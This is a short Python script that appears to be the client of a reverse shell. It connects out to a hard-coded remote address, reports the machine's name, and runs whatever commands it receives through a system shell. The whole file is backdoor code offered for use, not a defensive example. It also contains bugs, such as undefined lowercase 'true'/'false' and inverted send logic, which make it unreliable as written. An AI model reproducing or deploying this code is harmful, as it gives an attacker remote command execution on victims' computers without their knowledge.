import socket, os, subprocess, time
def connect():
    os.system('cls')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 5558
    host = ('10.8.101.16')
    #localIP in case your testing inside your network
    #host = socket.gethostbyname('YOURDNSHOSTHERE')
    #here you could insert a DNS host and then use it to connect over WAN.
    try:
        print ('[!] Trying to connect to %s:%s'%(host,port))
        s.connect((host,port))
        print ('[*] Connection estabilished.')
        s.send(os.environ['COMPUTERNAME'])
        #popen = true
    except:
        print ('Could not connect.')
        time.sleep(10)
        connect()

def receive():
    quit = false
    receive = s.recv(100024)
    print 'receive: %s'%(receive)
    if receive == ('quit'):
        s.close()
        connect()
        quit = true
    elif receive[0:5] == ('shell'):
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        args = proc2.stdout.read() + proc2.stderr.read()
    else:
        args = ('no valid input was given.')
    if (quit):
        send(args)

def send(args):
        send = s.send(args)
        receive()

def main():
    connect()
    receive()
    s.close()

main()
